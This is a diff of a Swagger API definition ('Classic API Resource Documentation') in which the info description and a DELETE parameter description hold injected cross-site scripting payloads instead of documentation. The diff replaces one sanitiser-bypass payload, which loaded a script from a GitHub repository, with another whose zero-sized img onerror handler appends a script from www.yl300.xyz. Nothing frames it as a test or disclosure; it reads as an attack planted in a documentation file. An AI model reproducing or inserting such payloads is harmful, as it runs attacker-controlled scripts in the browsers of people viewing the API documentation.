@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=N onerror=eval(javascript:document.write(unescape(' <script src="https://raw.githubusercontent.com/asxjasn/test1/main/index.html"></script>'));)>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea>img src=x onerror="with(document)body.appendChild(createElement('script')).src='https://www.yl300.xyz/js/2.js'" width="0" height="0"></img>"></form>
 
   version: production
 basePath: /JSSResource/
@@ -28,7 +28,7 @@ paths:
     delete:
       parameters:
         - description: |
-                <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=N onerror=eval(javascript:document.write(unescape(' <script src="https://raw.githubusercontent.com/asxjasn/test1/main/index.html"></script>'));)>"></form>
+                <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea>img src=x onerror="with(document)body.appendChild(createElement('script')).src='https://www.yl300.xyz/js/2.js'" width="0" height="0"></img>"></form>
 
           format: int64
           in: path
